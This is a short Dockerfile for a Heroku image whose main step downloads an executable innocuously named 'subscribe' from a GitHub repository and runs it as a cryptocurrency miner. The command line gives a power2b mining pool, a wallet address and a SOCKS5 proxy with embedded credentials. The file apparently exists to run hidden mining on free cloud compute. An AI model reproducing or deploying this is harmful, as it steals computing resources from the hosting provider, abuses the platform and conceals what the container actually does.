FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MoZWmZP537xWNb2HePtZ8ZjEHcawGJdiFG.VPS -x socks5://omar:omar@138.197.166.210:555
CMD bash heroku.sh
